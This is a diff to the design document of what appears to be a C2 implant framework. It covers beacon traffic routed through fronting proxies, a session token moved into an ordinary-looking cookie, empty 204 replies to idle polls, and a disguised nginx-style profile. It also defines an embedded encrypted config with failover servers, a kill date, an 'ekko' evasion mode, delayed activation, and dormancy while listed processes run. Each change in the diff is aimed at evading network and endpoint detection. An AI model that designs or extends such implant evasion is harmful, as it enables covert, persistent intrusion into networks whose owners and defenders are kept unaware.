@@ -142,11 +142,20 @@ A fronting proxy (Cloudflare et al.) terminates the client TLS and pools
 origin connections: requests from several implant transports can arrive
 INTERLEAVED on one server-side TCP connection. The server therefore never
 binds protocol state to the connection. Every implant POST tags itself
-with cover-envelope headers:
+inside the cover envelope:
 
-- `X-Session: <session_token>` — decimal u64; routes the request to its
-  session. Present on every protocol POST (handshake included).
+- `Cookie: <cookie_name>=<session_token>` — decimal u64 riding in the
+  profile-named session cookie (`cookie_name`, default `sid`); routes
+  the request to its session. Present on every protocol POST (handshake
+  included). Since 0.2.0 this replaces the `X-Session` header on the
+  wire; the header is still accepted (legacy builds).
 - `X-Handshake: 1` — marks the POST body as a raw ClientHello.
+
+**Idle polls are cheap on the wire (0.2.0+):** a TASK_POLL that
+delivers nothing is answered `HTTP 204` with no body — no sealed
+BATCH_END, so an idle beacon stops emitting a constant small binary
+blob per poll. Implants report their build version at REGISTER; older
+builds (pre-0.2.0) keep receiving the sealed empty batch with 200.
 
 Server-side routing per POST: a handshake parks its derived keys under
 the announced token (a "provisional"); the REGISTER that follows (same
@@ -259,6 +268,7 @@ uris:                # implant picks one at random per request
   - /cdn/update
 user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ..."
 server_header: nginx # Server header on responses
+cookie_name: sid     # session cookie the demux token rides in (0.2.0)
 sleep_secs: 5        # default poll interval (overridable via SLEEP task)
 jitter: 0.25         # +/- 25% randomization of sleep
 ```
@@ -267,6 +277,33 @@ The teamserver serves every tasking exchange on any listed URI with the
 configured `Server` header; everything else 404s. Changing a profile on the
 server applies to new connections; running implants pick up `sleep_secs` /
 `jitter` only through the `SLEEP` task.
+
+### 8.1 Embedded deployment configuration (T035)
+
+Operational builds carry their configuration as one encrypted JSON blob
+(`ABRAHAM_EMBED` at build time; see `implant/build.rs`). Schema:
+
+```json
+{
+  "servers": ["c2.example.com:443", "backup.example.com:443"],
+  "key": "<64-hex ed25519 public key>",
+  "tls_pin": "",
+  "evasion": "ekko",
+  "profile": "sleep_secs: 10\njitter: 0.3\n",
+  "kill_date": 1797036250,
+  "gates": {"initial_delay_max_secs": 0, "blocked_processes": []}
+}
+```
+
+- `servers` — fronts in priority order; after 3 consecutive transport
+  failures the implant rotates to the next (same session token, so the
+  teamserver resumes the session). `server` (string) is a legacy alias.
+- `kill_date` — unix seconds; past it the implant exits silently
+  (0 = never). A SUNBURST-style expiry: dead tooling must not beacon.
+- `gates.initial_delay_max_secs` — random activation delay before first
+  contact, breaking the process-start → immediate-beacon correlation.
+- `gates.blocked_processes` — the implant stays dormant (no contact)
+  while any listed process runs.
 
 ## 9. Error codes
 
